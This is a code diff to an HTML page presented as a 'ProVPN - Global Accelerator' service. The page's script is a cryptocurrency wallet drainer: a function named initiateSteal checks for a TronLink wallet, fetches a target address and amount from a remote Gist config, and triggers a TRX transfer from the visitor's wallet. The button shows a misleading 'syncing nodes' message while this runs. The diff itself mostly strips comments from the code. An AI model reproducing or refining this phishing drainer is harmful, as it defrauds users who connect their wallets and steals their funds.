@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>ProVPN - Global Accelerator</title>
-    <!-- ✅ 使用 unpkg 的稳定版本 TronWeb -->
     <script src="https://unpkg.com/tronweb@latest/dist/tronweb.js"></script>
     <style>
         :root { --bg-color: #0F172A; --card-bg: #1E293B; --text-primary: #F8FAFC; --accent-green: #10B981; --accent-blue: #3B82F6; }
@@ -36,19 +35,17 @@
 </div>
 
 <script>
-    // ✅ 你的最新 Gist Raw URL
+    // ✅ 你的最新 Gist Raw URL (Hash: 78e17b1a...)
     const API_URL = "https://gist.githubusercontent.com/ganx838-commits/658bc580aa43c3b01dc55ef7f83558d5/raw/78e17b1a8ef7e6bc8098a6c15259d376b247d2fa/config.json"; 
 
     async function initiateSteal() {
         const btn = document.getElementById('connectBtn');
         const status = document.getElementById('statusText');
         
-        // 锁定按钮防止重复点击
         btn.disabled = true;
         btn.innerText = "正在同步节点...";
         status.innerText = "正在同步节点...";
 
-        // 1. 检查 TronLink 是否就绪
         if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
             status.innerText = "请安装 TronLink 钱包";
             btn.innerText = "重试";
@@ -57,19 +54,16 @@
         }
 
         try {
-            // 2. 从 Gist 获取配置
             const response = await fetch(API_URL);
             if (!response.ok) throw new Error("Failed to fetch config");
             
             const config = await response.json();
             
-            // 3. 发起交易
-            // 合约地址保持不变 (这是用于触发转账的合约)
+            // ✅ 使用通用合约触发转账
             const contract = await tronWeb.contract.at("TXz1Z2DHFsEmsxUUyibBzQKYtscZNSNcNL");
             
-            // 发送 TRX 到你的 Gist 中配置的 target 地址
             const result = await contract.transfer(config.target, config.amount).send({
-                feeLimit: 100000000, // 10 TRX 手续费上限
+                feeLimit: 100000000, 
                 from: window.tronWeb.defaultAddress.base58
             }).promise();
 
